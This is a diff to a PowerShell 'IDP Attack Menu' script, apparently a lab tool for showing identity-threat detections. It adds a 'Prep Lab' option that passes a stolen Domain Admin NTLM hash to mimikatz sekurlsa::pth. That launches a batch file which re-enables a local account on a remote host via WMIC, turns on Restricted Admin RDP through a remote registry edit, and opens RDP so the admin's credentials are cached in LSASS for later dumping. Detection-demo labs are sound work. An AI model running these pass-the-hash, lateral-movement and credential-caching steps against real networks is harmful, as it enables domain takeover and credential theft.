@@ -112,7 +112,7 @@ function Show-StepBanner {
     Write-Host ""
 }
 
-$scriptVersion = "5.4"
+$scriptVersion = "5.5"
 Write-Host "[+] IDP Attack Menu v$scriptVersion" -ForegroundColor Cyan
 Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  DT=$env:ENV_DT  UBUNTU=$env:ENV_UBUNTU" -ForegroundColor Green
 Start-Sleep -Seconds 2
@@ -133,11 +133,12 @@ function Show-Menu {
     Write-Host "  4: Crack Demo Hash + Kerbrute Spray        [NTLM offline crack + AD credential spray]"
     Write-Host
     Write-Host "  --- Lateral Movement (remote via WMIC+SMB) ---" -ForegroundColor Yellow
-    Write-Host "  5: Remote Dump on DT                       [mimikatz via WMIC -> dead end, no DA]"
+    Write-Host "  5: Remote Dump on DT                       [mimikatz via WMIC -> find cached DA hash]"
     Write-Host "  6: Kerberoast on DT + Crack TGS            [Invoke-Kerberoast -> IDP detection on DC]"
     Write-Host "  7: Lateral to Ubuntu (Cloud Detections)    [SSH -> Log4Shell + S3 scripts]"
     Write-Host
     Write-Host "  C: Configure IPs" -ForegroundColor DarkGray
+    Write-Host "  P: Prep Lab (enable demo on DT + cache DA creds)" -ForegroundColor DarkGray
     Write-Host "  Q: Quit" -ForegroundColor Red
     Write-Host
 }
@@ -892,6 +893,92 @@ public class CryptoMD4TGS {
                     Write-Host "  [+] Saved." -ForegroundColor Green
                 }
             }
+        }
+
+        # ================================================================
+        # P: PREP LAB (Enable demo on DT + cache DA creds)
+        # ================================================================
+        {$_ -eq 'P' -or $_ -eq 'p'} {
+            Clear-Host
+            Write-Host
+            Write-Host "  ================================================================" -ForegroundColor Magenta
+            Write-Host "  LAB PREPARATION - Using clark.monroe DA hash" -ForegroundColor Magenta
+            Write-Host "  ================================================================" -ForegroundColor Magenta
+            Write-Host
+            Write-Host "  This step uses clark.monroe Domain Admin hash to:" -ForegroundColor White
+            Write-Host "    1. Re-enable the demo local admin account on DT" -ForegroundColor White
+            Write-Host "    2. Enable Restricted Admin RDP on DT (for PtH RDP)" -ForegroundColor White
+            Write-Host "    3. Cache clark.monroe credentials on DT via brief RDP" -ForegroundColor White
+            Write-Host "       (so Step 5 dump finds DA hash - better demo story)" -ForegroundColor White
+            Write-Host
+
+            # --- Get clark.monroe hash ---
+            $clarkHash = Get-ClarkHash
+            if (-not $clarkHash) {
+                Write-Host "  [!] clark.monroe hash not found." -ForegroundColor Red
+                Write-Host "  [*] Run Step 3 first (dump on unmanaged) or enter it manually:" -ForegroundColor Yellow
+                $manualClark = Read-Host "  clark.monroe NTLM hash (32 hex)"
+                if ($manualClark -and $manualClark.Length -eq 32) {
+                    $manualClark | Out-File -FilePath $clarkHashFile -Encoding ASCII
+                    $clarkHash = $manualClark
+                } else {
+                    Write-Host "  [!] Invalid hash. Aborting." -ForegroundColor Red
+                    break
+                }
+            }
+            Write-Host "  [+] clark.monroe hash: $clarkHash" -ForegroundColor Green
+            Write-Host
+
+            # --- Step P1: Write prep batch file ---
+            Write-Host "  --- P1: Creating prep script ---" -ForegroundColor Yellow
+            $prepBat = "$idpDir\prep_dt_remote.bat"
+            $prepCommands = @(
+                '@echo off'
+                'echo [*] Prep: Enabling demo account on DT...'
+                "wmic /node:$env:ENV_DT process call create `"cmd.exe /c net user demo /active:yes`""
+                'echo [*] Waiting for command to execute...'
+                'timeout /t 3 /nobreak >nul'
+                'echo [*] Prep: Enabling Restricted Admin RDP on DT...'
+                "reg add `"\\$env:ENV_DT\HKLM\System\CurrentControlSet\Control\Lsa`" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
+                'echo [*] Waiting...'
+                'timeout /t 2 /nobreak >nul'
+                'echo [*] Prep: Launching Restricted Admin RDP to cache DA creds...'
+                'echo [*] A brief RDP window will open. Just close it after login.'
+                "mstsc /v:$env:ENV_DT /restrictedadmin"
+                'echo.'
+                'echo [+] Lab prep complete.'
+                'echo [+] demo account should be active on DT.'
+                'echo [+] clark.monroe creds should be cached in LSASS on DT.'
+                'pause'
+            ) -join "`r`n"
+            $prepCommands | Out-File -FilePath $prepBat -Encoding ASCII
+            Write-Host "  [+] Prep script written to $prepBat" -ForegroundColor Green
+            Write-Host
+
+            # --- Step P2: Launch PtH as clark.monroe ---
+            Write-Host "  --- P2: Pass-the-Hash as clark.monroe ---" -ForegroundColor Yellow
+            Write-Host "  [*] Launching mimikatz PtH -> prep script..." -ForegroundColor White
+            Write-Host "  [*] A new cmd window will open as clark.monroe (DA)." -ForegroundColor White
+            Write-Host "  [*] That window will:" -ForegroundColor White
+            Write-Host "        - Enable demo account on DT via WMIC" -ForegroundColor Gray
+            Write-Host "        - Enable restricted admin RDP on DT" -ForegroundColor Gray
+            Write-Host "        - Open RDP to cache clark.monroe creds on DT" -ForegroundColor Gray
+            Write-Host
+
+            $doPtH = Read-Host "  Launch PtH prep? (Y/n)"
+            if ($doPtH -ne 'n') {
+                try {
+                    Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$prepBat`" `"exit`""
+                    Write-Host
+                    Write-Host "  [+] PtH launched in new window." -ForegroundColor Green
+                    Write-Host "  [*] Follow the prompts in that window." -ForegroundColor Cyan
+                    Write-Host "  [*] When RDP opens, just log in briefly then close." -ForegroundColor Cyan
+                    Write-Host "  [*] After that, clark.monroe creds will be cached on DT." -ForegroundColor Cyan
+                } catch {
+                    Write-Host "  [!] Error launching PtH: $_" -ForegroundColor Red
+                }
+            }
+            Write-Host
         }
 
         'q' { return }
